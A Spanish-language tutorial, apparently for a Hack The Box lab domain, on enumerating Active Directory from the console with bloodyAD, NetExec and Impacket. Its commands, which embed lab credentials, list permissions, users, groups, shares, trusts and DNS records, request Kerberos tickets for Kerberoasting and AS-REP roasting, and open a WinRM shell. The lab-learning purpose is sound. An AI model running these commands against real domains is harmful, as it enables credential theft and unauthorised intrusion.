# Enumeración de Active Directory desde consola

Desde la consola se puede averiguar casi todo lo importante de Active Directory sin abrir BloodHound.  
La idea es hacer preguntas clave y responderlas con herramientas como `bloodyAD`, `NetExec` e `Impacket`.

---

# 1. ¿Qué puedo modificar con mi usuario?

```bash
bloodyAD --host 10.129.168.103 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get writable
```

Este comando muestra los objetos de Active Directory sobre los cuales el usuario `alex.turner` tiene permisos de escritura, creación o modificación.

También puedes pedir más detalle:

```bash
bloodyAD --host 10.129.168.103 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get writable --detail
```

Ejemplo de salida:

```text
distinguishedName: OU=Employees,DC=checkpoint,DC=htb
permission: CREATECHILD
```

Esto significa que el usuario puede crear objetos dentro de la OU `Employees`.

---

# 2. ¿A qué grupos pertenece mi usuario?

```bash
bloodyAD --host 10.129.168.103 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get membership alex.turner
```

Esto sirve para saber si el usuario pertenece a grupos interesantes.

Grupos a revisar:

```text
Domain Admins
Enterprise Admins
Account Operators
Backup Operators
Server Operators
Remote Management Users
IT
Helpdesk
VPN
Employees
```

---

# 3. ¿Qué objetos hay dentro de una OU?

Como te salió algo parecido a esto:

```text
OU=Employees,DC=checkpoint,DC=htb
permission: CREATECHILD
```

Puedes listar qué objetos existen dentro de esa OU:

```bash
bloodyAD --host 10.129.168.103 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get children "OU=Employees,DC=checkpoint,DC=htb"
```

Esto puede mostrar usuarios, grupos, equipos u otros objetos dentro de esa unidad organizativa.

---

# 4. ¿Qué información tiene un usuario específico?

Ejemplo con el usuario `Alex Turner`:

```bash
bloodyAD --host 10.129.168.103 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get object "CN=Alex Turner,OU=Employees,DC=checkpoint,DC=htb"
```

Atributos interesantes a revisar:

```text
memberOf
description
servicePrincipalName
userAccountControl
pwdLastSet
lastLogon
adminCount
msDS-AllowedToDelegateTo
```

Estos campos pueden revelar grupos, descripciones útiles, cuentas de servicio, delegaciones o configuraciones inseguras.

---

# 5. ¿Hay usuarios con SPN? Kerberoasting

Con Impacket:

```bash
impacket-GetUserSPNs checkpoint.htb/alex.turner:'Checkpoint2024!' -dc-ip 10.129.168.103
```

Para solicitar tickets Kerberos:

```bash
impacket-GetUserSPNs checkpoint.htb/alex.turner:'Checkpoint2024!' -dc-ip 10.129.168.103 -request
```

Esto permite identificar cuentas con `Service Principal Name`, lo cual puede ser útil para revisar exposición a Kerberoasting.

---

# 6. ¿Hay usuarios vulnerables a AS-REP Roasting?

Primero puedes obtener usuarios:

```bash
netexec ldap 10.129.168.103 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --users
```

Luego probar AS-REP Roasting con Impacket:

```bash
impacket-GetNPUsers checkpoint.htb/ -usersfile users.txt -dc-ip 10.129.168.103 -no-pass
```

O usando credenciales válidas:

```bash
impacket-GetNPUsers checkpoint.htb/alex.turner:'Checkpoint2024!' -dc-ip 10.129.168.103 -request
```

Esto busca usuarios que no requieren preautenticación Kerberos.

---

# 7. ¿Qué shares SMB puedo ver?

```bash
netexec smb 10.129.168.103 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --shares
```

Si encuentras un recurso compartido con permisos de lectura o escritura, puedes conectarte con:

```bash
smbclient //10.129.168.103/NOMBRE_SHARE -U 'checkpoint.htb/alex.turner%Checkpoint2024!'
```

Permisos interesantes:

```text
READ
WRITE
```

Si tienes `WRITE`, puede ser especialmente relevante.

---

# 8. ¿Puedo entrar por WinRM?

```bash
netexec winrm 10.129.168.103 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!'
```

Si la salida muestra algo como:

```text
Pwn3d!
```

Puedes intentar conexión con Evil-WinRM:

```bash
evil-winrm -i 10.129.168.103 -u alex.turner -p 'Checkpoint2024!' -r checkpoint.htb
```

---

# 9. ¿Qué políticas de contraseña tiene el dominio?

```bash
netexec smb 10.129.168.103 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --pass-pol
```

Esto puede mostrar información como:

```text
Longitud mínima de contraseña
Intentos antes de bloqueo
Duración del bloqueo
Historial de contraseñas
Complejidad requerida
```

Sirve para saber si un password spraying podría bloquear cuentas o no.

---

# 10. ¿Qué usuarios existen?

```bash
netexec ldap 10.129.168.103 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --users
```

Otra opción con Impacket:

```bash
impacket-GetADUsers checkpoint.htb/alex.turner:'Checkpoint2024!' -dc-ip 10.129.168.103 -all
```

Esto enumera usuarios del dominio.

---

# 11. ¿Qué grupos existen?

```bash
netexec ldap 10.129.168.103 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --groups
```

Grupos interesantes a buscar:

```text
Domain Admins
Enterprise Admins
Account Operators
Backup Operators
DnsAdmins
Remote Management Users
SQL Admins
IT Support
Helpdesk
```

---

# 12. ¿Qué equipos existen en el dominio?

```bash
netexec ldap 10.129.168.103 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --computers
```

También puedes usar `bloodyAD`:

```bash
bloodyAD --host 10.129.168.103 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get search --filter '(objectClass=computer)'
```

Esto permite identificar servidores, estaciones de trabajo y posibles objetivos internos.

---

# 13. ¿Hay trusts con otros dominios?

```bash
bloodyAD --host 10.129.168.103 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get trusts
```

Esto responde si el dominio `checkpoint.htb` tiene relaciones de confianza con otros dominios.

---

# 14. ¿Hay registros DNS internos interesantes?

```bash
bloodyAD --host 10.129.168.103 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get dnsDump
```

Esto puede revelar nombres internos como:

```text
dc01.checkpoint.htb
sql.checkpoint.htb
fileserver.checkpoint.htb
backup.checkpoint.htb
intranet.checkpoint.htb
```

Estos nombres pueden ayudarte a descubrir nuevos objetivos internos.

---

# 15. ¿Puedo generar datos para BloodHound sin abrir todavía el gráfico?

Con NetExec:

```bash
netexec ldap 10.129.168.103 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --bloodhound --collection All
```

Esto genera datos compatibles con BloodHound, aunque no necesitas abrir el grafo inmediatamente.

Si solo quieres seguir en consola, puedes revisar primero:

```bash
netexec ldap 10.129.168.103 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --users
netexec ldap 10.129.168.103 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --groups
netexec ldap 10.129.168.103 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --computers
```

---

# Orden recomendado para tu caso

Como ya tienes una salida parecida a esta:

```text
CN=Mark Davies,...,CN=Deleted Objects,DC=checkpoint,DC=htb   permission: WRITE
OU=Employees,DC=checkpoint,DC=htb                            permission: CREATECHILD
CN=Alex Turner,OU=Employees,DC=checkpoint,DC=htb             permission: WRITE
```

El orden recomendado sería:

---

## Paso 1: Ver permisos con más detalle

```bash
bloodyAD --host 10.129.168.103 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get writable --detail
```

---

## Paso 2: Revisar qué hay dentro de la OU Employees

```bash
bloodyAD --host 10.129.168.103 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get children "OU=Employees,DC=checkpoint,DC=htb"
```

---

## Paso 3: Revisar el objeto eliminado

Debes copiar exactamente el `distinguishedName` completo que te mostró la consola.

Ejemplo:

```bash
bloodyAD --host 10.129.168.103 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get object "CN=Mark Davies\0ADEL:...,CN=Deleted Objects,DC=checkpoint,DC=htb"
```

---

## Paso 4: Revisar grupos del usuario actual

```bash
bloodyAD --host 10.129.168.103 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get membership alex.turner
```

---

## Paso 5: Revisar shares SMB

```bash
netexec smb 10.129.168.103 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --shares
```

---

## Paso 6: Revisar si puedes entrar por WinRM

```bash
netexec winrm 10.129.168.103 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!'
```

---

## Paso 7: Revisar usuarios, grupos y equipos

```bash
netexec ldap 10.129.168.103 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --users
netexec ldap 10.129.168.103 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --groups
netexec ldap 10.129.168.103 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --computers
```

---

# Resumen

Desde consola puedes consultar:

- Qué objetos puedes modificar.
- A qué grupos pertenece tu usuario.
- Qué usuarios existen.
- Qué grupos existen.
- Qué equipos existen.
- Qué recursos SMB puedes leer o escribir.
- Si puedes conectarte por WinRM.
- Qué políticas de contraseña tiene el dominio.
- Si hay usuarios vulnerables a Kerberoasting.
- Si hay usuarios vulnerables a AS-REP Roasting.
- Si existen trusts con otros dominios.
- Qué registros DNS internos existen.
- Qué objetos eliminados existen y si puedes interactuar con ellos.

En resumen, BloodHound te muestra el camino de forma gráfica, pero desde consola puedes obtener la misma información de forma textual y ordenada.
